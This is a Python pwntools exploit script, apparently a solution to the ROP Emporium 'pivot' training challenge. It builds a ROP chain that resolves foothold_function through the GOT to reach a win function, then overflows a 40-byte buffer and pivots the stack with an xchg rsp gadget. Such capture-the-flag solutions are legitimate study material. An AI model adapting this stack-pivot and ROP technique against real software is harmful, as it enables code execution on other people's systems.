#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
tb foothold_function
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()

    io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
    pivot_address = int(io.recvline(), 16)
    success(f"Pivot address @ 0x{pivot_address:02x}")
    io.recvuntil(b"> ")

### attack 1 - 256 bytes for ROP
    rop = b""

    # call foothold_function to populate got
    rop += p64(elf.plt['foothold_function'])

    rop += p64(0x4009bb) # pop rax 
    rop += p64(elf.got['foothold_function'])

    rop += p64(0x4009c0) # mov rax, qword ptr [rax]; ret;

    rop += p64(0x4007c8) # pop rbp; ret;
    rop += p64(0x117)

    rop += p64(0x4009c4) # add rax, rbp; ret;
    
    rop += p64(0x4006b0) # call rax - ret2win!

    rop += p8(0x1) # dummy val
    rop += p64(elf.plt['exit'])

    send(rop)

### attack 2 - overflow the buf to pivot - 64 bytes read
    io.recvuntil(b"> ")
    garbage = b"A"*40

    overflow = b""

    overflow += p64(0x00000000004009bb) # pop rax
    overflow += p64(pivot_address)
    overflow += p64(0x00000000004009bd) # xchg rsp, rax;

    payload = garbage + overflow
    send(payload)

    ### shell
    io.interactive()
